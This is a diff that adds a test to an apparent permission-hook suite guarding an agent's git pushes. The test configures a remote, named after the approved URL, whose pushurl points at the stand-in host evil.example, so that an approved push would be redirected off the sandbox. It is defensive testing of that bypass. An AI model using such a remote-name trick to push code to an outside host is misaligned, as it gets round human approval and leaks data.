@@ -463,6 +463,19 @@ test('on: a push URL that git would rewrite again stays in the sandbox (Dwight M
   assert.equal(out.hookSpecificOutput.updatedInput, undefined, 'but not outside the sandbox');
 });
 
+// Dwight M2b: git push <arg> first reads <arg> as a remote NAME, so a remote named
+// after the URL, with a pushurl of its own, sends the push there. Real git.
+test('on: a push URL that is also a remote name stays in the sandbox (Dwight M2b)', async (t) => {
+  const origin = gitRepo(t);
+  require('node:child_process').execFileSync('git', ['-C', origin, 'config', `remote.${URL}.pushurl`, 'git@evil.example:o/r.git']);
+  const f = await floor(t, { version: 1, rules: [PUSH_RULE] });
+  await hook(f, PUSH, origin);
+  f.server.decideGrant(f.server.pendingGrants()[0].id, true);
+  const out = await hook(f, PUSH, origin);
+  assert.equal(decisionOf(out), 'allow', 'still the approved push');
+  assert.equal(out.hookSpecificOutput.updatedInput, undefined, 'but not outside the sandbox');
+});
+
 test('on: a push URL that starts with a dash stays in the sandbox (Dwight L3)', async (t) => {
   const origin = gitRepo(t);
   const f = await floor(t, { version: 1, rules: [PUSH_RULE] });
